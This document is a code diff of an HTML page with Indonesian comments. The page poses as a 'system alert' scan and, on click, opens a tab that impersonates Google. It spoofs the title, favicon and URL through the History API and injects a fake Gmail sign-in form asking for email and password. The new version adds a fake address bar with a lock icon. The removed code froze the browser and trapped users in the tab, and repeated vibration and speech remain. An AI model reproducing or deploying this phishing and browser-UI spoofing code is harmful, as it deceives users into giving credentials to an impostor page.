@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Advanced Stale Origin Spoofing</title>
+<title>Security Indicator Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Advanced Stale Origin).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Security Indicator Spoofing).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -55,73 +55,60 @@ startBtn.addEventListener("click", function() {
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu Advanced Stale Origin Spoofing...";
+    statusDiv.textContent = "Memicu Security Indicator Spoofing...";
 
     function picuTerusMenerus() {
         dipicu++;
         try {
-            // 1. Buka tab kosong
             const w = window.open('about:blank', '_blank');
             
             if (w) {
                 try {
-                    // 2. UI FREEZE / CPU BLOCKING (500ms)
-                    // Membuat UI hang sementara agar browser tidak sempat render ulang Address Bar
-                    const start = Date.now();
-                    while (Date.now() - start < 500) {}
-
-                    // 3. TITLE & FAVICON SPOOFING
+                    // 1. TITLE BAR SPOOFING
                     w.document.title = "Google";
+
+                    // 2. FAVICON SPOOFING
                     const link = w.document.createElement('link');
                     link.rel = 'icon';
                     link.href = 'https://www.google.com/favicon.ico'; 
                     w.document.head.appendChild(link);
 
-                    // 4. HISTORY API SPOOFING
-                    // Mencoba mengganti URL Address Bar menjadi google.com
+                    // 3. HISTORY API SPOOFING (Mencoba mengganti URL)
                     try {
                         w.history.replaceState({}, '', 'https://google.com');
                     } catch(e) {}
 
-                    // 5. INJEKSI KONTEN PALSU
+                    // 4. SECURITY INDICATOR SPOOFING (UI Injection)
                     w.document.body.style.margin = "0";
                     w.document.body.style.padding = "0";
-                    w.document.body.style.background = "#fff"; // Background putih ala Google
-                    w.document.body.style.color = "#333";
-                    w.document.body.style.display = "flex";
-                    w.document.body.style.alignItems = "center";
-                    w.document.body.style.justifyContent = "center";
-                    w.document.body.style.height = "100vh";
+                    w.document.body.style.background = "#fff";
                     w.document.body.style.fontFamily = "Arial, sans-serif";
-                    w.document.body.style.textAlign = "center";
                     
-                    // Tampilan Fake Google Search / Login
+                    // Tampilan Fake Google Login + Fake URL Bar di dalam halaman
                     w.document.body.innerHTML = `
-                        <div style="text-align:center; width:100%; max-width:400px;">
-                            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
-                            <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
-                            <p style="font-size:14px; color:#5f6368; margin-bottom:30px;">to continue to Gmail</p>
-                            <input type="email" placeholder="Email or phone" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                            <input type="password" placeholder="Password" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
-                            <button style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
-                            <p style="color:#f00; font-size:10px; margin-top:20px;">Origin: google.com | Hacked by Waguri</p>
+                        <!-- FAKE ADDRESS BAR / SECURITY INDICATOR -->
+                        <div style="background:#e8eaed; padding:10px 15px; display:flex; align-items:center; border-bottom:1px solid #dadce0;">
+                            <div style="background:#fff; border-radius:20px; padding:8px 15px; display:flex; align-items:center; width:100%; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+                                <span style="color:#5f6368; margin-right:10px; font-size:16px;">🔒</span>
+                                <span style="color:#202124; font-size:14px; font-weight:bold;">https://accounts.google.com/signin</span>
+                            </div>
+                        </div>
+
+                        <!-- KONTEN LOGIN PALSU -->
+                        <div style="display:flex; align-items:center; justify-content:center; height:calc(100vh - 60px); text-align:center; background:#fff;">
+                            <div style="width:100%; max-width:400px; padding:20px;">
+                                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:200px; margin-bottom:20px;">
+                                <h2 style="font-size:20px; font-weight:normal; margin-bottom:20px; color:#202124;">Sign in</h2>
+                                <p style="font-size:14px; color:#5f6368; margin-bottom:30px;">to continue to Gmail</p>
+                                <input type="email" placeholder="Email or phone" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
+                                <input type="password" placeholder="Password" style="width:100%; padding:13px 15px; margin-bottom:15px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;">
+                                <button style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Next</button>
+                                <p style="color:#f00; font-size:10px; margin-top:20px;">Security Indicator Spoofed by Waguri</p>
+                            </div>
                         </div>
                     `;
 
-                    // 6. BLOKIR KELUAR (beforeunload & blur)
-                    // Membuat tab sulit ditutup atau ditinggalkan
-                    w.eval(`
-                        window.addEventListener('beforeunload', function (e) {
-                            e.preventDefault();
-                            e.returnValue = 'Sistem sedang memproses, yakin ingin keluar?';
-                            return 'Sistem sedang memproses, yakin ingin keluar?';
-                        });
-                        window.addEventListener('blur', function() {
-                            window.focus();
-                        });
-                    `);
-
-                    // 7. GETAR & TTS BERULANG
+                    // 5. GETAR & TTS BERULANG
                     w.eval(`
                         if (navigator.vibrate) {
                             setInterval(function() {
